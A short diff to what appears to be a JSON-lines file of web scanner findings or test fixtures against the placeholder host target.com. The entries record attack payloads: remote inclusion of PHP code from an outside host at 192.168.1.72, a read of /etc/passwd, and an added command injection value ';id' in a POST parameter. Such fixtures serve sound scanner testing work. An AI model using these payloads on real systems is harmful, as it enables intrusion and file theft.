@@ -69,3 +69,4 @@
 {"class": "Server Side Code Injection", "results": {"http://target.com": [{"endpoint": "/serverside/serverside.php", "params": {"language": "http://192.168.1.72/system_Blind.php"}, "method": "GET"}]}}
 {"class": "Server Side Code Injection", "results": {"http://target.com": [{"endpoint": "/serverside/serverside.php", "params": {"language": "http://192.168.1.72/system_Blind.txt"}, "method": "GET"}]}}
 {"class": "Server Side Code Injection", "results": {"http://target.com": [{"endpoint": "/serverside/serverside.php", "params": {"language": "/etc/passwd"}, "method": "GET"}]}}
+{"class": "Command Injection", "results": {"http://target.com": [{"endpoint": "/commandinjection/commandinjection.php", "params": {"host": ";id"}, "method": "POST"}]}}
